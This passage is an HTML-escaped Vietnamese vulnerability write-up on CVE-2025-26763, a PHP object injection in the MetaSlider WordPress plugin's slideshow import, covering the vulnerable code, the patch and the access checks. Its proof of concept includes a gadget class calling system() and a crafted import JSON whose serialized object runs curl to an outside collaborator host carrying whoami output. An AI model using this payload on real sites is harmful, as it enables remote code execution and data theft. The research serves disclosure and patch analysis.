1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v3.94.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($slideshow[&amp;#39;meta&amp;#39;]) &amp;amp;&amp;amp; is_array($slideshow[&amp;#39;meta&amp;#39;])) {&#xA;    foreach ($slideshow[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;        update_post_meta(&#xA;            $new_slideshow_id,&#xA;            $key,&#xA;            maybe_unserialize(str_replace(&amp;#39;{#ID#}&amp;#39;, $new_slideshow_id, $value))&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒëo·∫°n m√£ n√†y, h√†m &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng (&lt;code&gt;$value&lt;/code&gt;). V√¨ c√°c gi√° tr·ªã n√†y kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra hay x√°c th·ª±c tr∆∞·ªõc khi unserialize, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n chu·ªói serialized ƒë·ªôc h·∫°i g√¢y PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v3.95.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#39; alt=&#34;Diff&#34; height=&#34;406&#34; width=&#34;1885&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ b·ªï sung hai l·ªõp b·∫£o v·ªá quan tr·ªçng ƒë·ªÉ ngƒÉn d·ªØ li·ªáu ƒë·ªôc h·∫°i b·ªã unserialize:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Ch·∫∑n ngay m·ªçi gi√° tr·ªã meta c√≥ d·∫°ng serialized object (O:). N·∫øu ph√°t hi·ªán, qu√° tr√¨nh import d·ª´ng l·∫°i v√† slideshow b·ªã xo√°.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($slideshow[&amp;#39;meta&amp;#39;]) &amp;amp;&amp;amp; is_array($slideshow[&amp;#39;meta&amp;#39;])) {&#xA;    foreach ($slideshow[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;&#xA;        // @since 3.95 - Stop the process and cleanup if we catch non valid data in JSON&#xA;        if ( is_serialized( $value ) &amp;amp;&amp;amp; substr( trim( $value ), 0, 2 ) === &amp;#39;O:&amp;#39; ) {&#xA;            wp_trash_post($new_slideshow_id);&#xA;&#xA;            return new WP_Error(&#xA;                &amp;#39;import_slideshow_error&amp;#39;,&#xA;                esc_html__( &amp;#39;Import file is invalid.&amp;#39;, &amp;#39;ml-slider&amp;#39; )&#xA;            );&#xA;        }&#xA;&#xA;        update_post_meta(&#xA;            $new_slideshow_id,&#xA;            $key,&#xA;            $this-&amp;gt;maybe_unserialize(str_replace(&amp;#39;{#ID#}&amp;#39;, $new_slideshow_id, $value))&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Thay th·∫ø &lt;code&gt;maybe_unserialize()&lt;/code&gt; b·∫±ng phi√™n b·∫£n an to√†n h∆°n, d√πng &lt;code&gt;unserialize(..., [&#39;allowed_classes&#39; =&amp;gt; false])&lt;/code&gt; ƒë·ªÉ &lt;strong&gt;kh√¥ng cho ph√©p t·∫°o object&lt;/strong&gt; khi gi·∫£i n√©n d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function maybe_unserialize( $data ) {&#xA;    if ( is_serialized( $data ) ) { // Don&amp;#39;t attempt to unserialize data that wasn&amp;#39;t serialized going in.&#xA;        return @unserialize( trim( $data ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh·ªù ƒë√≥, nguy c∆° PHP Object Injection ƒë∆∞·ª£c lo·∫°i b·ªè.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt POST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected $namespace = &amp;#39;metaslider/v1&amp;#39;;&#xA;register_rest_route($this-&amp;gt;namespace, &amp;#39;/slideshow/import&amp;#39;, array(array(&#xA;    &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;    &amp;#39;callback&amp;#39; =&amp;gt; array($this-&amp;gt;api, &amp;#39;import_slideshows&amp;#39;),&#xA;    &amp;#39;permission_callback&amp;#39; =&amp;gt; array($this-&amp;gt;api, &amp;#39;can_access&amp;#39;)&#xA;)));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;v·ªõi callback &lt;code&gt;import_slideshows&lt;/code&gt; v√† ki·ªÉm tra quy·ªÅn th√¥ng qua &lt;code&gt;can_access()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const DEFAULT_CAPABILITY_EDIT_SLIDES = &amp;#39;edit_others_posts&amp;#39;;&#xA;public function can_access()&#xA;{&#xA;    $capability = apply_filters(&amp;#39;metaslider_capability&amp;#39;, MetaSliderPlugin::DEFAULT_CAPABILITY_EDIT_SLIDES);&#xA;&#xA;    // Check for the nonce on the server (used by WP REST)&#xA;    if (isset($_SERVER[&amp;#39;HTTP_X_WP_NONCE&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_key($_SERVER[&amp;#39;HTTP_X_WP_NONCE&amp;#39;]), &amp;#39;wp_rest&amp;#39;)) {&#xA;        return current_user_can($capability);&#xA;    }&#xA;&#xA;    // This is for when not using Axios (example: callout.php)&#xA;    if (isset($_REQUEST[&amp;#39;METASLIDER_NONCE&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_key($_REQUEST[&amp;#39;METASLIDER_NONCE&amp;#39;]), &amp;#39;metaslider_request&amp;#39;)) {&#xA;        return current_user_can($capability);&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y ch·ªâ cho ph√©p ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;edit_others_posts&lt;/code&gt; t·ª©c l√† &lt;strong&gt;editor&lt;/strong&gt; tr·ªü l√™n, ƒë∆∞·ª£c g·ªçi API.&lt;/p&gt;&#xA;&lt;p&gt;N√≥ x√°c th·ª±c theo hai c√°ch:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;N·∫øu c√≥ header &lt;code&gt;X-WP-Nonce&lt;/code&gt;, plugin ki·ªÉm tra nonce &lt;code&gt;&#39;wp_rest&#39;&lt;/code&gt;, r·ªìi x√°c nh·∫≠n ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;edit_others_posts&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu c√≥ tham s·ªë &lt;code&gt;METASLIDER_NONCE&lt;/code&gt;, plugin ki·ªÉm tra nonce &lt;code&gt;&#39;metaslider_request&#39;&lt;/code&gt;, r·ªìi ti·∫øp t·ª•c ki·ªÉm tra quy·ªÅn.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;N·∫øu kh√¥ng h·ª£p l·ªá ·ªü c·∫£ hai tr∆∞·ªùng h·ª£p, quy·ªÅn truy c·∫≠p API b·ªã t·ª´ ch·ªëi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_slideshows($request)&#xA;{&#xA;    if (!$this-&amp;gt;can_access()) {&#xA;        $this-&amp;gt;deny_access();&#xA;    }&#xA;&#xA;    $data = $this-&amp;gt;get_request_data($request, array(&amp;#39;slideshows&amp;#39;));&#xA;&#xA;    if (!$data[&amp;#39;slideshows&amp;#39;]) {&#xA;        wp_send_json_error(array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Nothing to import.&amp;#39;, &amp;#39;ml-slider&amp;#39;)&#xA;        ), 400);&#xA;    }&#xA;&#xA;    $status = $this-&amp;gt;slideshows-&amp;gt;import((array) json_decode($data[&amp;#39;slideshows&amp;#39;], true));&#xA;&#xA;    if (is_wp_error($status)) {&#xA;        wp_send_json_error(array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; $status-&amp;gt;get_error_message()&#xA;        ), 400);&#xA;    }&#xA;&#xA;    wp_send_json_success($status, 200);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;import_slideshows&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ki·ªÉm tra quy·ªÅn truy c·∫≠p&lt;/strong&gt;&#xA;N·∫øu &lt;code&gt;can_access()&lt;/code&gt; tr·∫£ v·ªÅ false ‚Üí ch·∫∑n ngay b·∫±ng &lt;code&gt;deny_access()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;L·∫•y d·ªØ li·ªáu ƒë·∫ßu v√†o&lt;/strong&gt;&#xA;L·∫•y tr∆∞·ªùng &lt;code&gt;slideshows&lt;/code&gt; t·ª´ request. N·∫øu kh√¥ng c√≥ d·ªØ li·ªáu ‚Üí tr·∫£ l·ªói ‚ÄúNothing to import‚Äù.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Gi·∫£i m√£ JSON v√† ti·∫øn h√†nh import&lt;/strong&gt;&#xA;Gi·∫£i m√£ n·ªôi dung &lt;code&gt;slideshows&lt;/code&gt; r·ªìi g·ªçi h√†m &lt;code&gt;$this-&amp;gt;slideshows-&amp;gt;import()&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;X·ª≠ l√Ω l·ªói&lt;/strong&gt;&#xA;N·∫øu import tr·∫£ v·ªÅ &lt;code&gt;WP_Error&lt;/code&gt; ‚Üí g·ª≠i JSON error v·ªõi th√¥ng b√°o l·ªói.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Th√†nh c√¥ng&lt;/strong&gt;&#xA;N·∫øu kh√¥ng c√≥ l·ªói ‚Üí tr·∫£ v·ªÅ JSON success k√®m k·∫øt qu·∫£ import.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Theo m√¥ t·∫£ c·ªßa h√†m &lt;code&gt;import()&lt;/code&gt; th√¨ &lt;code&gt;$slideshows&lt;/code&gt; l√† data ƒë∆∞·ª£c export t·ª´ &lt;strong&gt;slideshows ƒë√£ t·∫°o&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Tr√≠ch d·∫´n&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;/**&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Will import slideshows&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;li&gt;@param array $slideshows - The data generated by the export method&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;li&gt;@throws Exception - handled within method.&lt;/li&gt;&#xA;&lt;li&gt;@return WP_Error|array - True on success, WP_Error on failure&#xA;*/&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;foreach ($slideshows as $index =&amp;gt; $slideshow) {&#xA;    ...&#xA;    foreach ($slideshow[&amp;#39;slides&amp;#39;] as $slide) {&#xA;        ...&#xA;        foreach ($slide[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;            $value = $this-&amp;gt;restore_image_urls_from_string($value);&#xA;            add_post_meta($new_slide_id, $key, maybe_unserialize($value));&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;import()&lt;/code&gt; duy·ªát l·∫ßn l∆∞·ª£t t·ª´ng slideshow trong &lt;code&gt;$slideshows&lt;/code&gt;, sau ƒë√≥ t·ª´ng slide trong m·ªói slideshow, v√† t·ª´ng meta c·ªßa m·ªói slide. V·ªõi m·ªói meta, n√≥ ph·ª•c h·ªìi URL h√¨nh ·∫£nh qua &lt;code&gt;$this-&amp;gt;restore_image_urls_from_string($value)&lt;/code&gt; r·ªìi th√™m meta m·ªõi cho slide b·∫±ng &lt;code&gt;add_post_meta($new_slide_id, $key, maybe_unserialize($value))&lt;/code&gt;. N√≥i c√°ch kh√°c, m√£ th·ª±c hi·ªán import to√†n b·ªô slideshow, slide v√† meta, ƒë·ªìng th·ªùi x·ª≠ l√Ω URL h√¨nh ·∫£nh v√† unserialize d·ªØ li·ªáu tr∆∞·ªõc khi l∆∞u v√†o c∆° s·ªü d·ªØ li·ªáu.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Editor sends POST request ‚Üí /metaslider/v1/slideshow/import&amp;#34;] --&amp;gt; B[&amp;#34;import_slideshows() invoked&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;can_access(): verify nonce &amp;#43; &amp;#39;edit_others_posts&amp;#39; capability&amp;#34;}&#xA;C -- Fail --&amp;gt; Z[&amp;#34;deny_access()&amp;#34;]&#xA;C -- Pass --&amp;gt; D[&amp;#34;Extract &amp;#39;slideshows&amp;#39; from request&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;json_decode(slideshows) ‚Üí array of slideshow data&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;slideshows-&amp;gt;import() begins&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;foreach ($slideshows as $slideshow)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;foreach ($slideshow[&amp;#39;slides&amp;#39;] as $slide)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;foreach ($slide[&amp;#39;meta&amp;#39;] as key =&amp;gt; value)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;value = restore_image_urls_from_string(value)&amp;#34;]&#xA;J --&amp;gt; K{&amp;#34;Is value serialized?&amp;#34;}&#xA;&#xA;K -- Yes --&amp;gt; L[&amp;#34;maybe_unserialize(value)&amp;#34;]&#xA;K -- No --&amp;gt; M[&amp;#34;Store meta normally&amp;#34;]&#xA;&#xA;L --&amp;gt; N{&amp;#34;Does unserialize create an object?&amp;#34;}&#xA;N -- Yes --&amp;gt; R[&amp;#34;Object Injection ‚Üí POP chain execution&amp;#34;]&#xA;N -- No --&amp;gt; M&#xA;&#xA;M --&amp;gt; O[&amp;#34;add_post_meta(new_slide_id, key, value)&amp;#34;]&#xA;O --&amp;gt; P[&amp;#34;Import continues for remaining slideshows&amp;#34;]&#xA;&#xA;R --&amp;gt; Q[&amp;#34;Exploit achieved&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class ƒë·ªÉ test ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;T·∫°o m·ªôt slideshow b·∫•t k·ª≥, export ƒë·ªÉ l·∫•y JSON file m·∫´u.&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠a l·∫°i JSON file v·ªõi tr∆∞·ªùng &lt;code&gt;ml-slider_type&lt;/code&gt; (ho·∫∑c m·ªôt tr∆∞·ªùng ƒë∆∞·ª£c duy·ªát b·∫•t k√¨) ch·ª©a chu·ªói serialized.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;0&amp;#34;: {&#xA;    &amp;#34;title&amp;#34;: &amp;#34;New Slideshow&amp;#34;,&#xA;    &amp;#34;original_id&amp;#34;: 260,&#xA;    &amp;#34;meta&amp;#34;: {&#xA;      &amp;#34;metaslider_slideshow_theme&amp;#34;: &amp;#34;a:6:{s:6:\&amp;#34;folder\&amp;#34;;s:12:\&amp;#34;default-base\&amp;#34;;s:5:\&amp;#34;title\&amp;#34;;s:4:\&amp;#34;Base\&amp;#34;;s:4:\&amp;#34;type\&amp;#34;;s:4:\&amp;#34;free\&amp;#34;;s:8:\&amp;#34;supports\&amp;#34;;a:1:{i:0;s:4:\&amp;#34;flex\&amp;#34;;}s:4:\&amp;#34;tags\&amp;#34;;a:0:{}s:11:\&amp;#34;description\&amp;#34;;s:37:\&amp;#34;This is the default MetaSlider theme.\&amp;#34;;}&amp;#34;,&#xA;      &amp;#34;ml-slider_settings&amp;#34;: &amp;#34;...&amp;#34;&#xA;    },&#xA;    &amp;#34;slides&amp;#34;: [&#xA;      {&#xA;        &amp;#34;original_id&amp;#34;: 265,&#xA;        &amp;#34;order&amp;#34;: 0,&#xA;        &amp;#34;post_excerpt&amp;#34;: &amp;#34;&amp;#34;,&#xA;        &amp;#34;image&amp;#34;: &amp;#34;erol-ahmed-305920-unsplash-1&amp;#34;,&#xA;        &amp;#34;image_alt&amp;#34;: &amp;#34;erol-ahmed-305920-unsplash-1&amp;#34;,&#xA;        &amp;#34;meta&amp;#34;: {&#xA;          &amp;#34;ml-slider_type&amp;#34;: &amp;#34;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:74:\&amp;#34;curl http:\/\/9blonkz57zyrp69hwuz5tw0uoluci26r.oastify.com?leadked=$(whoami)\&amp;#34;;}&amp;#34;,&#xA;          &amp;#34;ml-slider_inherit_image_title&amp;#34;: &amp;#34;1&amp;#34;,&#xA;          &amp;#34;ml-slider_inherit_image_alt&amp;#34;: &amp;#34;1&amp;#34;,&#xA;          &amp;#34;ml-slider_crop_position&amp;#34;: &amp;#34;center-center&amp;#34;,&#xA;          &amp;#34;ml-slider_caption_source&amp;#34;: &amp;#34;image-caption&amp;#34;,&#xA;          &amp;#34;_wp_attachment_image_alt&amp;#34;: &amp;#34;&amp;#34;&#xA;        }&#xA;      }&#xA;    ]&#xA;  },&#xA;  &amp;#34;metadata&amp;#34;: {&#xA;    &amp;#34;version&amp;#34;: &amp;#34;3.94.0&amp;#34;,&#xA;    &amp;#34;date&amp;#34;: &amp;#34;2025/11/26&amp;#34;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Import l·∫°i file JSON ƒë∆∞·ª£c s·ª≠a.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#39; alt=&#34;Result&#34; height=&#34;575&#34; width=&#34;1042&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªói ph√°t sinh do plugin g·ªçi &lt;code&gt;maybe_unserialize()&lt;/code&gt; tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu import m√† kh√¥ng ki·ªÉm tra, cho ph√©p ch√®n chu·ªói serialized ƒë·ªôc h·∫°i d·∫´n ƒë·∫øn PHP Object Injection. B·∫£n v√° 3.95.0 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch ch·∫∑n serialized object v√† d√πng h√†m unserialize an to√†n h∆°n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë∆∞·ª£c unserialize d·ªØ 